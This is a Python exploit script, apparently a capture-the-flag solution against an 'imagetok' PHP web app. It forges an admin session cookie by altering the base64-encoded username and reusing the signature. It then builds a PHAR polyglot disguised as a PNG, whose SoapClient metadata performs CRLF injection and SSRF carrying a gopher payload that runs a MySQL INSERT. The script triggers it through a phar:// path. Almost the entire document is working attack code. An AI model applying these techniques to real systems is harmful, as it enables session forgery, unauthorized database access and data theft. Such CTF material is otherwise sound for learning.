import requests as req
import argparse
from urllib.parse import urlparse, unquote
import base64
import re
import os
import random
import string


RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
CYAN='\033[96m'
WHITE='\033[0m'

# rand_user = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
rand_user = "table"

# Argparser
my_parser = argparse.ArgumentParser()
my_parser.add_argument('--host', type=str, required=True)
args = my_parser.parse_args()

url = "http://"+ urlparse(args.host).netloc
file_path = "test.png"


php = '''
    <?php
    class ImageModel
    {
        public $file;
        public function __construct($file)
        {
            $this->file = new SoapClient(null, array(
                "location" => "http://localhost:80/proxy",
                "uri" => "http://localhost:80/proxy",
                "user_agent" => "clrf-inject\\r\\n\\r\\n\\r\\n\\r\\n".
                    "POST /proxy HTTP/1.1\\r\\n".
                    "Host: admin.imagetok.htb\\r\\n".
                    "Connection: close\\r\\n".
                    "Cookie: PHPSESSID=ADMIN_SESSION;\\r\\n".
                    "Content-Type: application/x-www-form-urlencoded\\r\\n".
                    "Content-Length: CONTENT_LENGTH\\r\\n\\r\\n".
                    "url=GOPHER_URL".
                    "\\r\\n\\r\\n\\r\\n"
            ));
        }
    }
    $phar = new Phar('payload.phar');
    $phar->startBuffering();
    $phar->addFile('IMAGE_FILE', 'IMAGE_FILE');
    $phar->setStub(file_get_contents('IMAGE_FILE') . ' __HALT_COMPILER(); ?>');
    $phar->setMetadata(new ImageModel('none'));
    $phar->stopBuffering();
    '''


# Make Admin Session
uploader = req.Session()
for i in range(0,4):
    data = {"uploadFile":open(file_path,'rb')}
    res = uploader.post(url+"/upload",files=data)

signature = uploader.cookies.get_dict()['PHPSESSID'].split(".")[1]
session = unquote(uploader.cookies.get_dict()['PHPSESSID'].split(".")[0])
session = base64.b64decode(session)
session = re.sub(r'"username":".+?"', f'"username":"admin"',session.decode("ascii"))
session =  base64.b64encode(bytes(session, 'utf-8'))
admin_session = session.decode("utf-8")+"."+signature


# Get Database Information
res = req.get(url+"/info")
db_user = re.findall(r'<td class="v">(.*?)</td>', res.text)[426]
db = re.findall(r'<td class="v">(.*?)</td>', res.text)[427]


# Create Gopher Payload
gopher_url = input(f"Database Username: {GREEN}{db_user}{WHITE}\nMySQL Query: {GREEN}INSERT INTO {db}.files(file_name, checksum, username) SELECT flag,\"1\",\"admin\" FROM {db}.definitely_not_a_flag;{WHITE}")




gopher_url = gopher_url.replace("gopher://","gopher:///")
php = php.replace('IMAGE_FILE',file_path)
php = php.replace('ADMIN_SESSION',admin_session)
php = php.replace('GOPHER_URL',gopher_url)
php = php.replace('CONTENT_LENGTH',str(len("url="+gopher_url)))
f = open(".main", "w")
f.write(php)
f.close()
os.system("php .main;rm .main;mv payload.phar payload.png")


# Upload phar
uploader = req.Session()
data = {"uploadFile":open("payload.png",'rb')}
res = uploader.post(url+"/upload", files=data)
session = unquote(uploader.cookies.get_dict()['PHPSESSID'].split(".")[0])
session = base64.b64decode(session)
payload_name = re.findall(r'"files":\[\{"file_name":"(.*?)"\}', session.decode("utf-8"))[0]

res = uploader.get(url+"/image/phar:%2f%2f"+payload_name+"%2ftest.png",cookies={"PHPSESSID":admin_session})

signature = uploader.cookies.get_dict()['PHPSESSID'].split(".")[1]
session = unquote(uploader.cookies.get_dict()['PHPSESSID'].split(".")[0])
session = base64.b64decode(session)
print(session)
